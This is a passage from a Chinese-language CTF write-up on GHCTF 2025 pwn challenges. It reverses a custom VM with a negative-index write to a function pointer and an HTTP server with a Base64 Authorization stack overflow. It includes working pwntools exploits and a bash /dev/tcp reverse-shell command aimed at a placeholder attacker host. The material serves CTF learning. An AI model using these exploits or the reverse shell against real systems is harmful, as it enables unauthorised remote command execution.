<li>这时我们的固定指令三寄存器操作就设计完成了。就像题目<code>gift</code>中所给出的这样（虽然题目的是32位的操作码）</li>
<li><strong>固定指令操作码</strong>：本质上就是指令固定长度，即我们固定<code>49-64</code>位这边<code>16字节</code>就表示操作码。不管是二寄存器操作还是一寄存器操作</li>
</ul>
</li>
<li><p><strong>扩展操作码</strong>：在我们执行三寄存器指令的时候，我们也使用<code>49-64</code>位表示指令，但是我们要留<code>1</code>位标志位，表示程序执行的操作码是二指令操作码。</p>
<ul>
<li>例如下图，我们选取第<code>49</code>位作为标志位，这时当标志位为<code>0</code>时执行的是<code>3</code>寄存器操作，这是<code>49-64</code>位表示指令（包含了标志位）</li>
<li>而当我们标志位为<code>1</code>时，我们执行的是<code>2</code>寄存器操作，这时我们<code>33-64</code>（包含了标志位）表示的就是指令并且表示<code>2</code>寄存器操作的指令，这时我们指令由原来的最高<code>16</code>位表示，拓展成了最高<code>32</code>位程序表示</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310163934291.png" alt="image-20250310163934291"></p>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310163954263.png" alt="image-20250310163954263"></p>
<h2 id="myvm分析1"><a href="#myvm分析1" class="headerlink" title="myvm分析1"></a>my<em>vm</em>分析1</h2><ul>
<li>按照流程我们先来<code>check</code>一下保护机制。发现并没有开启<code>PIE</code>保护</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310084657045.png" alt="image-20250310084657045"></p>
<ul>
<li><p>现在我们来反编译这个程序，查看一下这个程序的具体运行逻辑</p>
</li>
<li><p>我们先来查看<code>main</code>函数，我们按顺序分析这个程序</p>
<ul>
<li>首先会<code>funcptr</code>是一个函数指针，它指向了<code>my_print</code>这个函数，并且使用<code>init</code>对输入输出进行初始化</li>
<li>然后程序会让用户输入<code>SP</code>和<code>IP</code>，并且将用户输入的值放入<code>sp</code>和<code>ip</code>寄存器中。并检查用户输入的初始化值是否合法</li>
<li>之后程序会让用户输入程序要执行的指令数。然后进入循环，执行两个函数</li>
<li>最后调用<code>funcptr</code>这个函数指针指向的函数</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310164804658.png" alt="image-20250310164804658"></p>
<ul>
<li>接下来我们查看一下<code>fetch()</code>这个函数，发现就是一个取<code>memory[ip]</code>的值，并且将<code>ip</code>自增，然后返回取出来的值</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310165549267.png" alt="image-20250310165549267"></p>
<ul>
<li>接下来查看一下<code>execute()</code>这个函数，这个函数会将前面取出来的<code>memory[ip]</code>指令作为参数传递</li>
<li>这里我们一开始并不知道<code>HIBYTE(a1)</code>的值，此时我们就要查看汇编理解一下，我们先看到<code>v5</code>存储在<code>rbp-8</code>这个栈地址中</li>
<li>通过汇编我们可以看到<code>v5</code>存储的是<code>a1</code>的最高<code>8</code>位，之后通过伪c代码就可以看到<ul>
<li><code>v2</code>存储的值是<code>a1</code>的第<code>17-20</code>位</li>
<li><code>v3</code>存储的值是<code>a1</code>的第<code>9-12</code>位</li>
<li><code>v4</code>存储的值是<code>a1</code>的第<code>1-4</code>位</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310165818475.png" alt="image-20250310165818475"></p>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310170324721.png" alt="image-20250310170324721"></p>
<ul>
<li>我们接下去查看，我们会发现当<code>v5</code>即（<code>a1</code>的最高<code>8</code>位为特定的值时，会执行特定的类似于汇编指令）就像图中<ul>
<li><code>v5=0x50</code>，则会执行<code>reg[v2]=reg[v3]-reg[v4]</code>,也就是执行<code>sub</code>指令</li>
<li><code>v5=0x70</code>，则会执行<code>reg[v2]=reg[v3]&gt;&gt;reg[v4]</code>，也就执行<code>shr</code>指令</li>
<li>这时我们就可以知道，变量<code>v2</code>、<code>v3</code>、<code>v4</code>就代表着寄存器的编号。</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310170704072.png" alt="image-20250310170704072"></p>
<ul>
<li>这时我们通过逆向，可以归纳出剩下的指令，而该函数模拟的指令如下，这时我们还注意到<code>reg</code>这个数组是<code>int</code>类型，而不是<code>unsigned</code>类型</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x10</span>  reg[v2] = imm;      			mov imm</span><br><span class="line"><span class="number">0x20</span>  push reg[v2];		  			push</span><br><span class="line"><span class="number">0x30</span>  pop reg[v2]		 			pop</span><br><span class="line"><span class="number">0x40</span>  reg[v2] = reg[v3] + reg[v4];  add</span><br><span class="line"><span class="number">0x50</span>  reg[v2] = reg[v3] - reg[v4];  sub</span><br><span class="line"><span class="number">0x60</span>  reg[v2] = reg[v3] ^ reg[v4];	xor</span><br><span class="line"><span class="number">0x70</span>  reg[v2] = reg[v3] &gt;&gt; reg[v4];	shr</span><br><span class="line"><span class="number">0x80</span>  reg[v2] = reg[v3] &lt;&lt; reg[v4];	shl</span><br><span class="line"><span class="number">0x90</span>  memory[reg[v2]] = reg[v3];	mov [reg[v2]],reg[v3]</span><br></pre></td></tr></table></figure>
<ul>
<li>我们在函数这块还注意到有一个<code>后门函数</code></li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310172420018.png" alt="image-20250310172420018"></p>
<ul>
<li>我们现在来查看一下<code>.bss</code>段的全局变量，这时我们发现<code>funcptr</code>就在<code>memory</code>相邻低地址处</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310172233421.png" alt="image-20250310172233421"></p>
<ul>
<li>我们还注意到有<code>reg</code>这个数组</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310172727594.png" alt="image-20250310172727594"></p>
<ul>
<li>还注意到<code>stack</code></li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310172747886.png" alt="image-20250310172747886"></p>
<h2 id="my_vm分析2"><a href="#my-vm分析2" class="headerlink" title="my_vm分析2"></a>my_vm分析2</h2><ul>
<li>这时我们可以确定漏洞点，就是利用<code>memory[reg[v2]]</code>这个指令进行负索引，从而修改<code>funcptr</code>这个指针为<code>backdoor()</code>这个函数的地址。</li>
<li><p>接下来我们就来构造一个负索引，我们先初始化<code>sp=0</code>、<code>ip=0x1000</code></p>
</li>
<li><p>首先我们需要构造寄存器的值为负值。一开始我们的各个寄存器都为<code>0</code>,我们先通过<code>mov imm</code>操作，将这个寄存器<code>0、1、2</code>赋值为<code>8、4、20</code></p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">reg[<span class="number">0</span>]=<span class="number">8</span></span><br><span class="line">reg[<span class="number">1</span>]=<span class="number">4</span></span><br><span class="line">reg[<span class="number">2</span>]=<span class="number">20</span></span><br><span class="line">reg[<span class="number">3</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">4</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">5</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">6</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">7</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">8</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">9</span>]=<span class="number">0</span></span><br><span class="line">sp=<span class="number">0</span></span><br><span class="line">ip=<span class="number">0x100</span></span><br></pre></td></tr></table></figure>
<ul>
<li>之后我们通过<code>0x80</code>左移操作，将寄存器<code>r1</code>设置为<code>0x400000</code>，即：<code>r1=r1 &lt;&lt; r2</code>（<code>r1 =  4 &lt;&lt; 20</code>）</li>
<li>然后通过<code>0x10</code>这个操作将<code>0x877</code>赋值给<code>r3</code></li>
<li>最后通过<code>0x40</code>这个操作（<code>add</code>）将<code>r1</code>的值变为<code>0x400877</code>，这就是<code>backdoor</code>的地址，这一步操作就是为越界读写修改函数指针做准备</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">reg[0]=8</span><br><span class="line">reg[1]=0x400877</span><br><span class="line">reg[2]=20</span><br><span class="line">reg[3]=0x877</span><br><span class="line">reg[4]=0</span><br><span class="line">reg[5]=0</span><br><span class="line">reg[6]=0</span><br><span class="line">reg[7]=0</span><br><span class="line">reg[8]=0</span><br><span class="line">reg[9]=0</span><br><span class="line">sp=0</span><br><span class="line">ip=0x100</span><br></pre></td></tr></table></figure>
<ul>
<li>之后我们要构造负索引，这时我们就用<code>0x50</code>，<code>sub</code>指令，使<code>r4-r0</code>，这时我们就得到了负值。</li>
<li><p>最后我们再通过<code>0x90</code>存指令，直接就可以实现越界读写，使得<code>函数指针指向backdoor</code></p>
</li>
<li><p>至于负索引要索引到多少，就需要动调去计算偏移了。</p>
</li>
</ul>
<h2 id="my_vm_exp"><a href="#my-vm-exp" class="headerlink" title="my_vm_exp"></a>my_vm_exp</h2><ul>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28151</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./my_vm&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">op,r1,r2,r3=<span class="number">0</span></span>):</span><br><span class="line">    a = (op &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span></span><br><span class="line">    a +=(r1 &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    a +=(r2 &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line">    a +=(r3 &amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(a))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置PC=0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;IP:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置SP=0x0</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;SP:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置Code_size=0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;execve:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x8</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;break *0x400CFB&#x27;)</span></span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">20</span>)</span><br><span class="line">code(<span class="number">0x80</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>) <span class="comment"># r1 = 0x400000</span></span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">3</span>,<span class="number">0x08</span>,<span class="number">0x77</span>)</span><br><span class="line">code(<span class="number">0x40</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line">code(<span class="number">0x50</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x90</span>,<span class="number">4</span>,<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="fruit_ninja"><a href="#fruit-ninja" class="headerlink" title="fruit_ninja"></a>fruit_ninja</h1><ul>
<li><p>还没写完，先看看这篇博客</p>
</li>
<li><p><a href="https://iyheart.github.io/2024/09/25/CTFblog/PWN系列blog/WEB_pwn/web-pwn之httpd/?highlight=httpd">web-pwn之httpd | iyheart的博客</a></p>
</li>
</ul>
<h2 id="前置知识"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
<li>需要理解<code>Linux</code>系统编程中的<code>创建线程函数</code>：参考这篇博客：<a href="https://iyheart.github.io/2025/02/24/编程语言系列blog/Linux系统编程/Linux系统编程1/">Linux系统编程1 | iyheart的博客</a></li>
<li>需要理解<code>Linux</code>网络编程中的一些函数：这里直接问<code>AI</code>吧</li>
<li>需要了解一下<code>Http</code>协议。<a target="_blank" rel="noopener" href="https://www.runoob.com/http/http-messages.html">HTTP 消息结构 | 菜鸟教程</a>、<a target="_blank" rel="noopener" href="https://www.runoob.com/http/http-methods.html">HTTP 请求方法 | 菜鸟教程</a></li>
<li>注意：<strong>请求方法这边只要看<code>get</code>方法和<code>Post</code>方法即可</strong></li>
<li>反弹shell</li>
<li>这里也简单介绍一下相关知识吧。</li>
</ul>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><ul>
<li>什么是反弹shell，一般pwn都是我们攻击者去连接目标主机，而反弹shell是目标主机主动去连接攻击者的主机，并将执行权限给攻击者</li>
<li>反弹shell的前提：需要一个具有公网ip的服务器（IPv4）</li>
<li>在一般的情况下，pwn了目标主机，直接就<code>getshell</code>了，这时我们就可以直接<code>cat flag</code>目标主机就会将flag的内容发送给我们，但是在需要反弹shell的情况，当我们getshell之后，我们可以对目标主机执行命令，但是接收不到目标执行完命令后的内容。这就导致我们无法得到flag的内容，这时就是要反弹shell</li>
<li>反弹shell有几个办法，我们就先介绍一个办法吧：<ul>
<li>需要一个具有公网ip的服务器，假设其ip为<code>1.1.1.1</code>。</li>
<li>我们先指定开放该服务器的端口<code>2333</code>，输入指令为<code>nc -lvp 2333</code>或<code>nc -n -lvp 2333</code></li>
<li>然后我们getshell了目标靶机，这时我们就执行命令<code>bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1</code></li>
<li>这样目标靶机就连接上了我们的服务器，并且在我们服务器这边具有执行目标靶机目录的权限，也可以看到执行后的结果，这时我们就可以得到flag</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20240925182507092.png" alt="image-20240925182507092"></p>
<h2 id="fruitninja分析"><a href="#fruitninja分析" class="headerlink" title="fruitninja分析"></a>fruit<em>ninja</em>分析</h2><ul>
<li>题目来源：<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5143">[GHCTF 2024 新生赛]Fruit Ninja | NSSCTF</a></li>
<li>题目附件：<a target="_blank" rel="noopener" href="https://wwsq.lanzoue.com/inbAS2atudaf">https://wwsq.lanzoue.com/inbAS2atudaf</a> 密码:ffor</li>
<li>拿到附件先看看附件内容，发现文件<code>httpd</code>是一个二进制文件</li>
<li>然后<code>www</code>目录下的是web页面相关的前后端</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20240925162120040.png" alt="image-20240925162120040"></p>
<ul>
<li>查看一下保护，发现保护全开</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20240925162036762.png" alt="image-20240925162036762"></p>
<ul>
<li>接下来我们反编译一下该程序，先查看<code>main</code>函数，我们先理清楚一下<code>main</code>函数的执行过程</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">程序先从main函数开始</span><br><span class="line">---&gt;调用startup函数，启动服务器(用于初始化网络服务或客户端)</span><br><span class="line">---&gt;调用accept函数,用来接受一个连接请求(这里会接收一些http协议的内容)</span><br><span class="line">---&gt;pthread_create()这个函数其实是创建一个线程的函数,这时会在<span class="keyword">if</span>语句中调用这个函数</span><br><span class="line"><span class="comment"># 创建一个线程后，这个线程会执行第三个参数所指向的函数(这个参数其实是一个函数指针类型)</span></span><br><span class="line">---&gt;调用accept_request,将处理接受到的http协议的内容</span><br><span class="line"></span><br><span class="line"><span class="comment"># 具体来分析accept_request这个函数</span></span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20240925162422115.png" alt="image-20240925162422115"></p>
<ul>
<li>然后我们主要是仔细分析一下<code>accept_request</code>这个函数，这个函数首先会传递一个参数过来，这个参数是文件描述符，这个文件描述符就是用于处理<code>服务器</code>和<code>客户端</code>交互的。</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310194858857.png" alt="image-20250310194858857"></p>
<ul>
<li>这里我们先了解一下<code>HTTP</code>请求报文使用<code>GET</code>方法和<code>POST</code>方法大概的模版。<ul>
<li>我们可以看到<code>GET</code>方法传递的参数就跟在它后面即<code>/1.php</code></li>
<li>而<code>POST</code>方法传递的参数是在最后那一行，并且比起<code>GET</code>方法<code>POST</code>方法还多了两行<code>Content-Length</code>、<code>Content-Type</code></li>
<li>而<code>Content-Length</code>后面跟的数字表明我们最后一行传递的参数一共有多少个字节</li>
</ul>
</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 这是GET方法的http报文</span><br><span class="line">GET /1.php HTTP/1.1/\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>developer.mozilla.org\r\n</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>fr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 下面是POST方法的http报文</span><br><span class="line">POST /contact_form.php HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>developer.mozilla.org\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>64\r\n</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded\r\n</span><br><span class="line"></span><br><span class="line">name=Joe%20User&amp;request=Send%20me%20one%20of%20your%20catalogue</span><br></pre></td></tr></table></figure>
<ul>
<li>接下来我们分析一下<code>accept_request</code>函数，这个函数先会接收第一行<code>http</code>请求报文，然后判断是不是<code>GET</code>或者<code>POST</code>方法，如果是<code>GET</code>或者<code>POST</code>方法就继续处理数据。</li>
<li>如果是<code>GET</code>方法，就会获取相应的<code>web</code>目录</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310201446921.png" alt="image-20250310201446921"></p>
<ul>
<li>该协议会先处理<code>GET、POST</code>参数，参数正确则会将一下web页面等从服务器发送到客户端中<ul>
<li>这里在发送<code>web</code>页面之前还会检查我们请求路径的合法性，<code>s</code>这个字符串数组保存的就是<code>web</code>页面的路径</li>
<li>经过一些列检查后，如果检查都过了就会执行<code>execute_cgi(a1,s,s1,j)</code>这个函数，我们介绍一下这个函数传递的参数</li>
<li><code>a1</code>：是代表客户端的远程描述符，用于服务器与客户端交互</li>
<li><code>s</code>：服务器<code>web</code>页面的路径</li>
<li><code>s1</code>：接收的请求头（即<code>http</code>报文第一行）</li>
<li><code>j</code>：接收的参数个数</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310201844648.png" alt="image-20250310201844648"></p>
<ul>
<li>这里注意：如果请求的路径不合法这里就会发送<code>HTTP</code>响应报文比如<code>HTTP/1.0 404 NOT FOUND</code></li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">404</span> NOT FOUND\r\n</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>jdbhttpd/0.1.0\r\n</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html\r\n</span><br><span class="line">&lt;HTML&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;\r\n</span><br><span class="line">&lt;BODY&gt;&lt;P&gt;The server could not fulfill\r\n</span><br><span class="line">your request because the resource specified\r\n</span><br><span class="line">is unavailable or nonexistent.\r\n</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;\r\n</span><br></pre></td></tr></table></figure>
<ul>
<li>接下来我们查看一下函数<code>execute_cgi</code>具体的执行流程，我们先查看一下这个函数的局部变量</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310202510502.png" alt="image-20250310202510502"></p>
<ul>
<li>然后我们再查看一下函数具体执行逻辑，我们先会将<code>文件路径</code>复制给<code>dest</code></li>
<li>这个函数会根据<code>GET</code>或者<code>POST</code>方法选择处理报文的方式，这里我们重点就来看<code>POST</code>方法<ul>
<li>如果是<code>POST</code>方法就会接收并处理<code>Content-Length</code>、<code>Authorization: Basic</code></li>
<li>并且会调用<code>GdecBase64</code>函数对<code>Authorization: Basic</code>后面紧跟着的内容进行<code>Base64</code>解码，将解码后的结果存储在<code>V18</code>这里</li>
<li><strong>注意在这里就会有一个栈溢出的漏洞了</strong></li>
<li>之后会对<code>v18</code>的开头进行检查，检查是否为<code>pwner</code>，如果<code>v18</code>的开头不是<code>pwner</code>程序就会出问题</li>
</ul>
</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310202804379.png" alt="image-20250310202804379"></p>
<ul>
<li>我们会将<code>Base64</code>解码之前的数据存放在<code>v21</code>这边，然后解码之后会存放在<code>v18</code>这边，但是<code>v21</code>这边存储的字节比<code>v18</code>这边多很多，所以这边我们就可以通过溢出，有机会溢出到<code>dest</code>这个数组</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310203748471.png" alt="image-20250310203748471"></p>
<ul>
<li>之后我们再看一下之后的程序逻辑，检查完<code>pwner</code>后，正常情况下程序都会执行到<code>execl()</code>这边，而这里就相当于<code>execve</code>，只不过只不过这个时候我们远程交互用的文件描述符是<code>4</code>，而不是标准输出流。所以命令执行的结果并不会显示到我们的平面中，这时我们<code>getshell</code>之后就需要反弹<code>shell</code></li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310204023120.png" alt="image-20250310204023120"></p>
<ul>
<li>所以思路就是通过<code>Authorization: Basic</code>后面跟着的内容去构造栈溢出，并且使用<code>\x00</code>绕过<code>strcmp(v18, &quot;pwner&quot;)</code>这个检查</li>
<li>之后我们就可以<code>getshell</code>，<code>getshell</code>后就可以反弹shell了。这个构造栈溢出的偏移量自己手动算算就出来了。</li>
</ul>
<h2 id="fruit_ninja_exp"><a href="#fruit-ninja-exp" class="headerlink" title="fruit_ninja_exp"></a>fruit_ninja_exp</h2><ul>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">24279</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;pwner\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">250</span> +<span class="string">&#x27;/bin/bash\x00&#x27;</span></span><br><span class="line">s = b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line">body = <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1\n\r&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;POST /rule.cgi\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;Content-Length: &#123;&#125;\r\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(body))</span><br><span class="line">payload += <span class="string">&#x27;Authorization: Basic &#x27;</span>+ s +<span class="string">&#x27;\r\n\n&#x27;</span></span><br><span class="line">payload += body</span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="my_v8"><a href="#my-v8" class="headerlink" title="my_v8"></a>my_v8</h1><ul>
<li><code>my_v8</code>这题要写的内容太多了，就先挖个坑吧，来日方长，慢慢填。</li>
</ul>
<h2 id="my_v8_exp"><a href="#my-v8-exp" class="headerlink" title="my_v8_exp"></a>my_v8_exp</h2><ul>
